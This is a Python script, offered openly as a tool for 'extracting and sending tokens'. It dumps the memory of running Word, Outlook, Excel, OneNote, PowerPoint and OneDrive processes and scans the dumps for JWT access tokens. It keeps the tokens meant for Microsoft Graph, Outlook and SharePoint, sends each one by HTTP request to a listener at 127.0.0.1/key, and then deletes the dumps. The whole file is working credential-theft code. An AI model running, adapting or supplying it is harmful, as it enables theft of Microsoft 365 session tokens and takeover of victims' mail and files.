
# Efficient, expert version for extracting and sending tokens
import base64
import json
import os
import re
import ctypes
import win32api
import win32con
import win32file
import psutil
import requests

DBGHELP = ctypes.windll.dbghelp
KNOWN_PROCESSES = {"WINWORD", "ONENOTE", "POWERPNT", "OUTLOOK", "EXCEL", "OneDrive"}
KNOWN_AUD = {
    "https://graph.microsoft.com/",
    "https://outlook.office365.com/",
    "https://outlook.office.com",
    "sharepoint.com",
    "00000003-0000-0000-c000-000000000000"
}

def create_mini_dump(pid, file_name):
    p_handle = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION | win32con.PROCESS_VM_READ, 0, pid)
    f_handle = win32file.CreateFile(
        file_name,
        win32file.GENERIC_READ | win32file.GENERIC_WRITE,
        win32file.FILE_SHARE_READ | win32file.FILE_SHARE_WRITE,
        None,
        win32file.CREATE_ALWAYS,
        win32file.FILE_ATTRIBUTE_NORMAL,
        None
    )
    return DBGHELP.MiniDumpWriteDump(p_handle.handle, pid, f_handle.handle, 2, None, None, None)

def get_office_processes(pids=None):
    pairs = []
    for proc in psutil.process_iter(['name', 'pid']):
        try:
            name = proc.info['name']
            pid = proc.info['pid']
            if (pids and pid in pids) or (not pids and any(k in name for k in KNOWN_PROCESSES)):
                pairs.append((pid, name.split('.')[0]))
        except Exception:
            continue
    return pairs

def extract_and_send_tokens():
    if not os.path.isdir('Dump'):
        return
    for file in filter(lambda f: f.endswith('.DMP'), os.listdir('Dump')):
        with open(os.path.join('Dump', file), 'rb') as f:
            data = f.read()
        for match in re.findall(b'eyJ0eX[a-zA-Z0-9._\-]+', data):
            if b'.' not in match:
                continue
            try:
                payload_encoded = match.decode().split('.')[1]
                payload = base64.urlsafe_b64decode(payload_encoded + '=' * (4 - len(payload_encoded) % 4)).decode()
                js = json.loads(payload)
                aud = js.get('aud', '')
                if any(x in aud for x in KNOWN_AUD):
                    url = f"http://127.0.0.1/key?{match.decode()}"
                    try:
                        r = requests.get(url, timeout=3)
                        print(f"Sent token to {url}, status: {r.status_code}")
                    except Exception as e:
                        print(f"Failed to send token: {e}")
            except Exception:
                continue

def main():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--pids", nargs='+', type=int, default=None)
    args = parser.parse_args()

    pairs = get_office_processes(args.pids)
    if not pairs:
        print("No relevant processes found.")
        return
    print("Found relevant processes:")
    for pid, name in pairs:
        print(f"{name} -- {pid}")
    if not os.path.isdir('Dump'):
        os.mkdir('Dump')
    for pid, name in pairs:
        create_mini_dump(pid, f"Dump/{name}.DMP")
    print("Dumped processes.")
    extract_and_send_tokens()
    import shutil
    shutil.rmtree('Dump', ignore_errors=True)
    print("Tokens sent.")

if __name__ == '__main__':
    main()